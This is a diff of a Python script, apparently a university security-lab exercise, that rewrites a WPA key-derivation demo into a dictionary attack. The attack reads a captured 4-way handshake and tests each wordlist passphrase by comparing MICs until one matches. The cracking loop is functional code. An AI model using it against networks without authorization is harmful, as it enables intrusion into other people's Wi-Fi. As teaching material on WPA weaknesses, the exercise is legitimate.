@@ -2,18 +2,14 @@
 # -*- coding: utf-8 -*-
 
 """
-Derive WPA keys from Passphrase and 4-way handshake info
-
-Calcule un MIC d'authentification (le MIC pour la transmission de données
-utilise l'algorithme Michael. Dans ce cas-ci, l'authentification, on utilise
-sha-1 pour WPA2 ou MD5 pour WPA)
+Dictionary attack on on passphrase derived from the 4-way handshake info
 """
 
-__author__      = "Abraham Rubinstein et Yann Lederrey"
-__copyright__   = "Copyright 2017, HEIG-VD"
+__author__      = "Diego Villagrasa, Fabio Marques"
+__copyright__   = "Copyright 2021, HEIG-VD"
 __license__ 	= "GPL"
 __version__ 	= "1.0"
-__email__ 		= "abraham.rubinstein@heig-vd.ch"
+__email__ 		= "diego.villagrasa@heig-vd.ch"
 __status__ 		= "Prototype"
 
 from scapy.all import *
@@ -22,6 +18,7 @@ from pbkdf2 import *
 from numpy import array_split
 from numpy import array
 import hmac, hashlib
+
 
 def customPRF512(key,A,B):
     """
@@ -40,8 +37,8 @@ def customPRF512(key,A,B):
 wpa=rdpcap("wpa_handshake.cap") 
 
 # Important parameters for key derivation - most of them can be obtained from the pcap file
-passPhrase  = "actuelle"
 A           = "Pairwise key expansion" #this string is used in the pseudo-random function
+
 ssid        = "SWI"
 APmac       = ""
 Clientmac   = ""
@@ -54,7 +51,7 @@ SNonce      = ""
 # When attacking WPA, we would compare it to our own MIC calculated using passphrases from a dictionary
 mic_to_test = ""
 
-data        = ""
+data = ""
 
 # Empty values to compare to
 emptyNONCE = b"0000000000000000000000000000000000000000000000000000000000000000"
@@ -133,35 +130,53 @@ for pkt in wpa:
                 mic_to_test = a2b_hex(mic)
                 data = pkt.payload.payload.payload.payload.info[1:].replace(mic_to_test, b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
 
+# Print gathered values
 print ("\n\nValues used to derivate keys")
 print ("============================")
-print ("Passphrase:\t",passPhrase)
-print ("SSID:\t\t",ssid)
-print ("AP Mac:\t\t",APmac.encode())
-print ("Cient Mac:\t",Clientmac.encode())
-print ("AP Nonce:\t",ANonce)
-print ("Client Nonce:\t",SNonce)
+print ("SSID: ",ssid,"\n")
+print ("AP Mac: ",APmac.encode(),"\n")
+print ("Cient Mac: ",Clientmac.encode(),"\n")
+print ("AP Nonce: ",ANonce,"\n")
+print ("Client Nonce: ",SNonce,"\n")
+print ("Mic: ",mic_to_test,"\n")
 
 B = min(a2b_hex(APmac),a2b_hex(Clientmac))+max(a2b_hex(APmac),a2b_hex(Clientmac))+min(a2b_hex(ANonce),a2b_hex(SNonce))+max(a2b_hex(ANonce),a2b_hex(SNonce))
 
-#calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
-passPhrase = str.encode(passPhrase)
-ssid = str.encode(ssid)
-pmk = pbkdf2(hashlib.sha1,passPhrase, ssid, 4096, 32)
+# Load the wordlist and iterate over it
+with open("wordlist.txt") as f:
+    while(True):
+        passPhrase  = f.readline().replace("\n", "")
 
-#expand pmk to obtain PTK
-ptk = customPRF512(pmk,str.encode(A),B)
+        if passPhrase == "":
+            break
 
-#calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
-mic = hmac.new(ptk[0:16],data,hashlib.sha1)
+        #calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
+        passPhrase = str.encode(passPhrase)
+        
+        pmk = pbkdf2(hashlib.sha1,passPhrase,ssid.encode(), 4096, 32)
+
+        #expand pmk to obtain PTK
+        ptk = customPRF512(pmk,str.encode(A),B)
+
+        #calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
+        mic = hmac.new(ptk[0:16],data,hashlib.sha1)
 
 
-print ("\nResults of the key expansion")
-print ("=============================")
-print ("PMK:\t\t",pmk.hex())
-print ("PTK:\t\t",ptk.hex())
-print ("KCK:\t\t",ptk[0:16].hex())
-print ("KEK:\t\t",ptk[16:32].hex())
-print ("TK:\t\t",ptk[32:48].hex())
-print ("MICK:\t\t",ptk[48:64].hex())
-print ("MIC:\t\t",mic.hexdigest())
+        print ("\nResults of the key expansion")
+        print ("=============================")
+        print ("Passphrase: ",passPhrase,"\n")
+        print ("PMK:\t\t",pmk.hex(),"\n")
+        print ("PTK:\t\t",ptk.hex(),"\n")
+        print ("KCK:\t\t",ptk[0:16].hex(),"\n")
+        print ("KEK:\t\t",ptk[16:32].hex(),"\n")
+        print ("TK:\t\t",ptk[32:48].hex(),"\n")
+        print ("MICK:\t\t",ptk[48:64].hex(),"\n")
+        print ("MIC:\t\t",mic.digest()[:-4],"\n")
+        print ("ORIG MIC:\t",mic_to_test,"\n")
+
+        # Check if the calculated mic is the same as the mic
+        if mic_to_test == mic.digest()[:-4]:
+            print("Found Passphrase: ", passPhrase.decode())
+            exit(0)
+
+print("Could not find passphrase")
